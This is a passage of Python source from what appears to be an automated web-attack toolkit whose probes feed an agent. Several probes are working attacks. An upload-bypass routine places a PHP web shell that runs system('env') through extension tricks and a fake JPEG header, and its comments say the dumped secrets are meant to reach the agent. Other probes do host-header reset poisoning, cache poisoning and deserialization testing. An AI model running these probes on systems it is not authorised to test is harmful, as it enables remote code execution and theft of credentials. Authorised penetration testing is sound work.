        pointing at our host is a critical, byte-proven receipt. We never
        request the poisoned host itself."""
        from ..email.provider import InboxProvider
        provider = InboxProvider()
        try:
            inbox = await provider.create_inbox()
            self.guard.check_url(url)
            await self._client.post(url, json={email_field: inbox.address,
                                               "username": inbox.address,
                                               "password": "Avci!pass1"})
            await self._client.post(url, json={email_field: inbox.address},
                                    headers={poison_header: _EVIL_HOST,
                                             "Host": _EVIL_HOST})
            msg = await provider.poll_for_message(timeout=150)
            body = (getattr(msg, "text", "") or "") if msg else ""
            links = list(getattr(msg, "verify_links", []) or []) if msg else []
            link = (links or re.findall(r"https?://[^\s\"'<>]+", body)
                    or [""])[0]
            if _EVIL_HOST in link:
                v = OracleVerdict("Password reset poisoning", "CONFIRMED",
                                  [{"check": "reset link points at attacker host",
                                    "pass": True}],
                                  f"emailed link uses {_EVIL_HOST}")
                return ProbeOutput("reset_poison", url, v, Evidence(
                    request=self._req_repr("POST", url,
                                           {poison_header: _EVIL_HOST}),
                    response_excerpt=link[:300]))
            v = OracleVerdict("Password reset poisoning", "FAILED", [],
                              "no poisoned link in inbox "
                              f"(inbox={inbox.address}, got={bool(msg)})")
            return ProbeOutput("reset_poison", url, v, Evidence(
                request=self._req_repr("POST", url, {poison_header: _EVIL_HOST}),
                response_excerpt=(body or "no mail")[:200]))
        finally:
            try:
                await provider.aclose()
            except Exception:  # noqa: BLE001
                pass

    # ====================================================================
    # graphql group
    # ====================================================================
    async def graphql_depth(self, url: str) -> ProbeOutput:
        q = "query{" + "a{" * 40 + "a" + "}" * 40 + "}"
        r = await self._client.post(url, json={"query": q})
        no_limit = r.status_code == 200 and ("errors" not in r.text[:200]
                                             or "depth" not in r.text.lower())
        v = OracleVerdict("GraphQL depth limit missing",
                          "CONFIRMED" if no_limit else "FAILED",
                          [{"check": "depth-40 query executed", "pass": no_limit}],
                          "no depth/complexity limit — DoS vector noted"
                          if no_limit else "depth limit enforced")
        return ProbeOutput("graphql_depth", url, v, Evidence(
            request=self._req_repr("POST", url) + f"\n{q[:80]}",
            response_status=r.status_code, response_excerpt=r.text[:250]))

    # --------------------------------------------------------------------
    async def graphql_batch(self, url: str) -> ProbeOutput:
        batch = [{"query": "{__typename}"} for _ in range(30)]
        r = await self._client.post(url, json=batch)
        ok = r.status_code == 200 and r.text.count("__typename") >= 1
        v = OracleVerdict("GraphQL batching allowed",
                          "CONFIRMED" if ok else "FAILED",
                          [{"check": "30-query batch executed", "pass": ok}],
                          "batch queries bypass per-request rate limits"
                          if ok else "batching disabled")
        return ProbeOutput("graphql_batch", url, v, Evidence(
            request=self._req_repr("POST", url) + " x30 batch",
            response_status=r.status_code, response_excerpt=r.text[:250]))

    # --------------------------------------------------------------------
    async def graphql_suggestions(self, url: str) -> ProbeOutput:
        q = {"query": "{userr(id: 1){id}}"}
        r = await self._client.post(url, json=q)
        hint = "did you mean" in r.text.lower() or "Did you mean" in r.text
        v = OracleVerdict("GraphQL field suggestions",
                          "CONFIRMED" if hint else "FAILED",
                          [{"check": "typo suggestion leaked schema",
                            "pass": hint}],
                          "field suggestions enumerate the schema even with "
                          "introspection off" if hint else "no suggestions")
        return ProbeOutput("graphql_suggestions", url, v, Evidence(
            request=self._req_repr("POST", url) + "\n{userr(id:1){id}}",
            response_status=r.status_code, response_excerpt=r.text[:300]))

    # ====================================================================
    # cache / web-layer group
    # ====================================================================
    async def cache_deception(self, url: str) -> ProbeOutput:
        base = await self._get(url)
        best = None
        for suffix in (".css", ".js", ".png", ".ico"):
            try:
                r = await self._get(url.rstrip("/") + suffix)
            except Exception:  # noqa: BLE001
                continue
            cc = r.headers.get("cache-control", "")
            v = self.oracle.judge_cache_deception(r.text, base.text, cc)
            if v.ok:
                return ProbeOutput("cache_deception", url + suffix, v, Evidence(
                    request=self._req_repr("GET", url + suffix),
                    response_status=r.status_code,
                    response_excerpt=f"CC={cc}; " + r.text[:200]))
            if best is None:
                best = v
        v = best or OracleVerdict("Web cache deception", "FAILED", [],
                                  "no suffix served private data")
        return ProbeOutput("cache_deception", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=base.status_code))

    # --------------------------------------------------------------------
    async def cache_poisoning(self, url: str) -> ProbeOutput:
        for h in ({"X-Forwarded-Host": _EVIL_HOST},
                  {"X-Forwarded-Scheme": "http"},
                  {"X-Original-URL": "/admin"},
                  {"X-Rewrite-URL": "/admin"}):
            r = await self._get(url, headers=h)
            poisoned = _EVIL_HOST in r.text or _EVIL_HOST in str(r.headers.values())
            admin_leak = ("/admin" in h.values().__iter__().__next__()
                          and ("admin" in r.text.lower()
                               and r.status_code == 200))
            if poisoned or admin_leak:
                v = OracleVerdict("Web cache poisoning", "CONFIRMED",
                                  [{"check": "unkeyed input reflected",
                                    "pass": True}],
                                  f"{list(h)[0]} reflected into response")
                return ProbeOutput("cache_poisoning", url, v, Evidence(
                    request=self._req_repr("GET", url, h),
                    response_status=r.status_code,
                    response_excerpt=r.text[:300]))
        v = OracleVerdict("Web cache poisoning", "FAILED", [],
                          "no unkeyed header influence")
        return ProbeOutput("cache_poisoning", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=200))

    # --------------------------------------------------------------------
    async def clickjacking(self, url: str) -> ProbeOutput:
        r = await self._get(url)
        xfo = r.headers.get("x-frame-options", "").lower()
        csp = r.headers.get("content-security-policy", "").lower()
        framed = not xfo and "frame-ancestors" not in csp
        v = OracleVerdict("Clickjacking (no framing defense)",
                          "CONFIRMED" if framed else "FAILED",
                          [{"check": "XFO absent + no frame-ancestors",
                            "pass": framed}],
                          "page can be framed" if framed else
                          f"XFO={xfo!r} present")
        return ProbeOutput("clickjacking", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=r.status_code,
            response_excerpt=f"XFO={xfo!r} CSP-FA={'frame-ancestors' in csp}"))

    # --------------------------------------------------------------------
    async def cookie_audit(self, url: str) -> ProbeOutput:
        r = await self._get(url)
        issues: list[str] = []
        for sc in r.headers.get_list("set-cookie") if hasattr(
                r.headers, "get_list") else [r.headers.get("set-cookie", "")]:
            if not sc:
                continue
            low = sc.lower()
            name = sc.split("=", 1)[0]
            if "httponly" not in low:
                issues.append(f"{name}: no HttpOnly")
            if "secure" not in low:
                issues.append(f"{name}: no Secure")
            if "samesite" not in low:
                issues.append(f"{name}: no SameSite")
        v = OracleVerdict("Cookie flag audit",
                          "CONFIRMED" if issues else "FAILED",
                          [{"check": "missing cookie flags", "pass": bool(issues)}],
                          "; ".join(issues[:6]) or "all flags present")
        return ProbeOutput("cookie_audit", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=r.status_code,
            response_excerpt=(r.headers.get("set-cookie", "") or "no cookies")[:300]))

    # --------------------------------------------------------------------
    async def options_methods(self, url: str) -> ProbeOutput:
        self.guard.check_url(url)
        r = await self._client.options(url)
        allow = r.headers.get("allow", "") + " " + r.headers.get(
            "access-control-allow-methods", "")
        risky = [m for m in ("PUT", "DELETE", "TRACE", "PATCH", "CONNECT")
                 if m in allow.upper()]
        trace_echo = False
        if "TRACE" in allow.upper():
            tr = await self._client.request("TRACE", url)
            trace_echo = "TRACE" in tr.text.upper()
        v = OracleVerdict("Dangerous HTTP methods",
                          "CONFIRMED" if (trace_echo or
                          {"PUT", "DELETE"} & set(risky)) else "FAILED",
                          [{"check": "TRACE echo (XST)", "pass": trace_echo},
                           {"check": "write methods exposed", "pass": bool(risky)}],
                          f"Allow={allow.strip()!r}" or "only safe methods")
        return ProbeOutput("options_methods", url, v, Evidence(
            request=self._req_repr("OPTIONS", url), response_status=r.status_code,
            response_excerpt=f"Allow: {allow.strip()}"))

    # --------------------------------------------------------------------
    async def debug_disclosure(self, url: str) -> ProbeOutput:
        t = _set_param(url, "avci_dbg", "'><\"({$__;")
        r = await self._get(t)
        hit = [s for s in _STACK_SIGS if s.lower() in r.text.lower()]
        v = OracleVerdict("Verbose error / stack trace disclosure",
                          "CONFIRMED" if hit else "FAILED",
                          [{"check": f"signature {h[:25]!r}", "pass": bool(h)}
                           for h in hit[:5]] or
                          [{"check": "no stack signatures", "pass": True}],
                          f"leaked: {hit[:3]}" if hit else "clean error handling")
        return ProbeOutput("debug_disclosure", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r.status_code,
            response_excerpt=r.text[:400]))

    # ====================================================================
    # disclosure group
    # ====================================================================
    async def backup_files(self, url: str) -> ProbeOutput:
        from ..recon.paths import SIGNATURES
        cands = [url + s for s in (".bak", "~", ".old", ".swp", ".orig",
                                   ".save", ".copy", ".txt")]
        for t in cands:
            try:
                r = await self._get(t)
            except Exception:  # noqa: BLE001
                continue
            if r.status_code == 200:
                for sig, title, sev in SIGNATURES:
                    if re.search(sig, r.text or ""):
                        v = OracleVerdict("Backup/source file exposure",
                                          "CONFIRMED",
                                          [{"check": title, "pass": True}],
                                          f"{t} → {title}")
                        return ProbeOutput("backup_files", t, v, Evidence(
                            request=self._req_repr("GET", t),
                            response_status=r.status_code,
                            response_excerpt=r.text[:300], ), note=sev)
        v = OracleVerdict("Backup/source file exposure", "FAILED", [],
                          "no readable backup variants")
        return ProbeOutput("backup_files", url, v, Evidence(
            request=self._req_repr("GET", url + ".bak")))

    # --------------------------------------------------------------------
    async def sourcemap_probe(self, url: str) -> ProbeOutput:
        t = url.rstrip("/") + ".map"
        r = await self._get(t)
        leak = r.status_code == 200 and ("sourcesContent" in r.text
                                         or '"sources"' in r.text)
        v = OracleVerdict("Source map exposure", "CONFIRMED" if leak else "FAILED",
                          [{"check": ".map with sources", "pass": leak}],
                          "original source + paths recoverable" if leak
                          else "not exposed")
        masked = (r.text or "")[:200]
        return ProbeOutput("sourcemap_probe", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r.status_code,
            response_excerpt=masked))

    # --------------------------------------------------------------------
    async def apiversion_scan(self, url: str) -> ProbeOutput:
        found = []
        for v in ("v0", "v1", "v2", "v3", "v1_1", "v2.0", "v3.0"):
            t = url.rstrip("/") + "/" + v
            try:
                r = await self._get(t)
            except Exception:  # noqa: BLE001
                continue
            if r.status_code == 200 and len(r.text) > 50:
                found.append(f"{t} ({len(r.text)}B)")
        interesting = len(found) >= 2
        v = OracleVerdict("API version surface",
                          "CONFIRMED" if interesting else "FAILED",
                          [{"check": "multiple live versions", "pass": interesting}],
                          "; ".join(found[:6]) or "single/no versions")
        return ProbeOutput("apiversion_scan", url, v, Evidence(
            request=self._req_repr("GET", url + "/v1"),
            response_excerpt="; ".join(found[:6])))

    # --------------------------------------------------------------------
    async def upload_bypass(self, url: str, file_field: str = "",
                            filename: str = "") -> ProbeOutput:
        """Arbitrary file upload via extension/content-type bypass.

        Finds a multipart form on the page (or takes the field name), uploads
        a marker PHP payload under a battery of filename variants, then hunts
        the stored file. Executed marker = code execution; raw source served
        = upload + disclosure. Bounded: 8 variants, 10 location fetches.
        """
        import hashlib
        import re as _re

        self.guard.check_url(url)
        marker = hashlib.md5(b"avci-upload").hexdigest()
        # env dump rides along with the marker: flags/secrets often live in
        # the process environment, and the echo keeps the oracle signal even
        # when system() is a disabled function
        php = f"<?php echo '{marker}'; system('env'); ?>"
        svg = (f"<svg xmlns='http://www.w3.org/2000/svg'>"
               f"<script type='text/javascript'>{marker}</script></svg>")
        # JPEG SOI+APP0 — the content-sniffing bypass (magic-byte /
        # getimagesize validators accept it; leading bytes are harmless to
        # PHP, which echoes anything outside its tags verbatim)
        jpg_magic = b"\xff\xd8\xff\xe0"

        # ---- discover the multipart form (field name + csrf/hidden data)
        field, data, base = file_field, dict(), url
        page = await self._get(url)
        mform = _re.search(
            r"<form[^>]*enctype=[\"']multipart/form-data[\"'][^>]*>(.*?)</form>",
            page.text or "", _re.S | _re.I)
        if mform:
            block = mform.group(1)
            mfile = _re.search(
                r"<input[^>]*type=[\"']file[\"'][^>]*name=[\"']([^\"']+)[\"']",
                block, _re.I) or _re.search(
                r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']file[\"']",
                block, _re.I)
            if mfile and not field:
                field = mfile.group(1)
            for name, val in _re.findall(
                    r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*value=[\"']([^\"']*)[\"']",
                    block, _re.I):
                if "submit" not in name.lower():
                    data[name] = val
            maction = _re.search(r"<form[^>]*action=[\"']([^\"']+)[\"']",
                                 page.text or "", _re.I)
            if maction:
                from urllib.parse import urljoin
                base = urljoin(url, maction.group(1))
        if not field:
            field = "file"

        variants = [filename] if filename else [
            "avci.php", "avci.phtml", "avci.php5", "avci.PHP",
            "avci.php.", "avci.php%00.jpg", "avci.jpg.php", "avci.svg"]

        def _accepted(r) -> bool:
            # a 200 can still be a REJECT — the message renders with the
            # form. Reject phrases sink it unless a strong multi-word
            # accept phrase vouches first.
            if r.status_code not in (200, 201, 302):
                return False
            low = (r.text or "").lower()
            if any(m in low for m in (
                    "successfully uploaded", "upload succeeded",
                    "was uploaded", "has been uploaded", "file is valid",
                    "saved", "stored")):
                return True
            return not any(m in low for m in (
                "invalid", "not allowed", "not permitted", "unsupported",
                "only support", "only accept", "only jpg", "only image",
                "forbidden", "denied", "rejected", "blocked", "failed",
                "error"))

        # pass 2 order: names that keep an image extension for the ext
        # check AND end in the script extension come first — a .php$-
        # anchored handler executes them; the null-byte trick and plain
        # script extensions follow for content-only validators
        pass2 = [filename] if filename else [
            "avci.jpg.php", "avci.jpeg.php", "avci.php%00.jpg",
            "avci.phtml", "avci.php", "avci.php5", "avci.PHP",
            "avci.php."]

        landings: list[str] = []
        uploaded_as = ""
        for magic_pass in (False, True):
            # pass 2 re-runs the battery with the JPEG SOI prefix so
            # content-sniffing validators see a real image header
            for fn in (variants if not magic_pass else pass2):
                if fn.endswith(".svg"):
                    if magic_pass:
                        continue
                    content, ctype = svg, "image/svg+xml"
                elif magic_pass:
                    content = jpg_magic + php.encode("latin-1")
                    ctype = "image/jpeg"
                else:
                    content, ctype = php, "image/gif"
                files = {field: (fn, content, ctype)}
                r = await self._client.post(base, data=data, files=files)
                if not _accepted(r):
                    continue
                uploaded_as = fn
                body = r.text or ""
                # response often names the landing spot
                for path in _re.findall(
                        r"(?:https?://[^\s\"'<>]+|/[^\s\"'<>]+)\.?(?:php|phtml"
                        r"|php5|jpg|png|svg|gif)", body):
                    if "avci" in path or "/upload" in path or "/static" in path \
                            or "/media" in path or "/file" in path:
                        from urllib.parse import urljoin
                        landings.append(urljoin(base, path))
                break  # first accepted variant is enough
            if uploaded_as:
                break

        if not uploaded_as:
            v = OracleVerdict("Arbitrary upload", "FAILED", [],
                              "no upload variant accepted")
            return ProbeOutput("upload_bypass", url, v, Evidence(
                request=self._req_repr("GET", url),
                response_status=page.status_code))

        # ---- hunt the stored file
        from urllib.parse import urljoin
        roots = ("/uploads/", "/upload/", "/files/", "/upfiles/",
                 "/static/uploads/", "/media/", "/assets/uploads/")
        cands = landings[:4] + [urljoin(url, r + uploaded_as) for r in roots]
        for c in cands[:10]:
            self.guard.check_url(c)
            try:
                r2 = await self._get(c)
            except Exception:  # noqa: BLE001
                continue
            if r2.status_code == 200 and marker in r2.text:
                executed = "<?php" not in r2.text
                sev = "CONFIRMED"
                v = OracleVerdict(
                    "Arbitrary file upload → " +
                    ("code execution" if executed else "source served raw"),
                    sev,
                    [{"check": f"{uploaded_as} accepted", "pass": True},
                     {"check": f"located at {c}", "pass": True},
                     {"check": "marker observable", "pass": True}],
                    f"upload field '{field}' accepted {uploaded_as}; "
                    f"{c} returns the marker"
                    + ("" if executed else " (raw source)"))
                return ProbeOutput("upload_bypass", url, v, Evidence(
                    request=self._req_repr("POST", base) +
                    f"\nmultipart: {field}={uploaded_as}",
                    response_status=r2.status_code,
                    # wide window on purpose: the executed env dump (which
                    # may carry flags/secrets) should reach the agent
                    response_excerpt=r2.text[:2000]))
        v = OracleVerdict("Upload accepted, landing unknown", "PENDING",
                          [{"check": f"{uploaded_as} accepted", "pass": True}],
                          f"uploaded as {uploaded_as} but stored path not "
                          f"found — inspect the app for the upload dir")
        return ProbeOutput("upload_bypass", url, v, Evidence(
            request=self._req_repr("POST", base) +
            f"\nmultipart: {field}={uploaded_as}",
            response_status=200))

    # --------------------------------------------------------------------
    async def deserialization_probe(self, url: str, param: str) -> ProbeOutput:
        """Insecure deserialization detection via error oracle.

        Sends serialized-object markers per runtime family (PHP serialize,
        Java rO0AB base64, Python pickle gASV, .NET /wE) into a param and
        watches for deserializer exceptions in the response — the classic
        blackbox receipt. 500-without-message = PENDING (suspicious).
        """
        import base64 as _b64

        self.guard.check_url(url)
        php = 'O:8:"stdClass":0:{}'
        java = _b64.b64encode(b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer")
        py = _b64.b64encode(b"\x80\x04\x95\x0f\x00\x00\x00\x00\x00\x00\x00"
                            b"\x8c\x08builtins\x8c\x03abs\x93.")
        net = _b64.b64encode(b"\xff\x01\x00\x00\x00") + b""
        payloads = (("php-serialize", php), ("java-stream", java),
                    ("python-pickle", py), ("dotnet-binary", net))
        sigs = {
            "php-serialize": ("unserialize", "__destruct", "serializ",
                              "could not be converted"),
            "java-stream": ("objectinputstream", "readobject",
                            "invalidclassexception", "streamcorrupted",
                            "classnotfound"),
            "python-pickle": ("pickle", "unpickling", "loads("),
            "dotnet-binary": ("typeload", "serializationexception",
                              "binaryformatter"),
        }
        # baseline: benign value
        base = await self._get(url)
        base_len = len(base.text or "")
        fam = None
        suspicious = False
        for name, val in payloads:
            val = val.decode("latin1") if isinstance(val, bytes) else val
            t = _set_param(url, param, val)
            r = await self._get(t)
            low = (r.text or "").lower()
            if any(s in low for s in sigs[name]):
                fam = (name, t, r)
                break
            if r.status_code == 500 and base.status_code != 500:
                suspicious = True
            elif (r.status_code == base.status_code
                  and abs(len(r.text or "") - base_len) > 400):
                suspicious = True
        if fam:
            name, t, r = fam
            v = OracleVerdict(
                "Insecure deserialization (" + name + ")",
                "CONFIRMED",
                [{"check": f"{name} payload triggered deserializer error",
                  "pass": True}],
                "deserializer exception leaked — object graph is attacker "
                "controlled; gadget chain territory")
            return ProbeOutput("deserialization_probe", url, v, Evidence(
                request=self._req_repr("GET", t), response_status=r.status_code,
                response_excerpt=(r.text or "")[:300]))
        v = OracleVerdict(
            "Insecure deserialization", "PENDING" if suspicious else "FAILED",
            [],
            "500/size-delta reactions without signature — retest with a "
            "runtime-specific gadget" if suspicious else
            "no deserializer reaction")
        return ProbeOutput("deserialization_probe", url, v, Evidence(
            request=self._req_repr("GET", url),
            response_status=base.status_code))

    # --------------------------------------------------------------------
    V03_REGISTRY = {
        "hpp": hpp,
        "nosql_injection": nosql_injection,
        "xpath_injection": xpath_injection,
        "ldap_injection": ldap_injection,
        "sqli_blind": sqli_blind,
        "cmd_timing": cmd_timing,
        "xss_ctx": xss_ctx,
        "open_redirect_bypass": open_redirect_bypass,
        "xxe": xxe,
        "ssrf_param": ssrf_param,
        "mass_assignment": mass_assignment,
        "negative_quantity": negative_quantity,
        "race_condition": race_condition,
        "account_enumeration": account_enumeration,
        "default_creds": default_creds,
        "reset_poison": reset_poison,
        "graphql_depth": graphql_depth,
        "graphql_batch": graphql_batch,
        "graphql_suggestions": graphql_suggestions,
        "cache_deception": cache_deception,
        "cache_poisoning": cache_poisoning,
        "clickjacking": clickjacking,
        "cookie_audit": cookie_audit,
        "options_methods": options_methods,
        "debug_disclosure": debug_disclosure,
        "backup_files": backup_files,
        "sourcemap_probe": sourcemap_probe,
        "apiversion_scan": apiversion_scan,
        "upload_bypass": upload_bypass,
        "deserialization_probe": deserialization_probe,
    }

    @classmethod
    def full_registry(cls) -> dict:
        return {**ExtendedProbeKit.full_registry(), **cls.V03_REGISTRY}
